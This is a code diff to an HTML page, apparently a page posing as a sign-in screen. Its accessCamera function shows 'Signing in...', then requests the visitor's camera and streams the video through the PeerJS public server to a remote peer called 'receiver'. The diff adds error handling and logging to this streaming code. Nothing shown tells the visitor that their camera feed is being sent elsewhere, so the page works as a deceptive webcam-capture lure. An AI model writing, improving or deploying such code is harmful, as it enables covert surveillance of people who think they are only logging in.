@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -51,20 +50,37 @@
     <script>
         function accessCamera() {
             document.getElementById('status').innerText = "Signing in...";
+
             const peer = new Peer({
                 host: 'peerjs.com',
                 port: 443,
                 secure: true
             });
+
             peer.on('open', id => {
-                console.log("Peer ID: " + id);
+                console.log("📲 Phone Peer ID: " + id);
             });
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                console.log("Camera stream acquired!");
-                peer.call('receiver', stream);
-                console.log("Calling receiver...");
-            }).catch(err => {
-                console.error("Camera error: ", err);
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                console.log("📸 Camera access granted");
+
+                const call = peer.call('receiver', stream);
+                if (!call) {
+                    console.error("❌ No peer connection to receiver");
+                    return;
+                }
+
+                call.on('close', () => {
+                    console.log("📴 Call closed");
+                });
+
+                call.on('error', err => {
+                    console.error("⚠️ Call error: ", err);
+                });
+            })
+            .catch(err => {
+                console.error("❌ Camera access denied:", err);
                 document.getElementById('status').innerText = "Camera blocked or unsupported.";
             });
         }
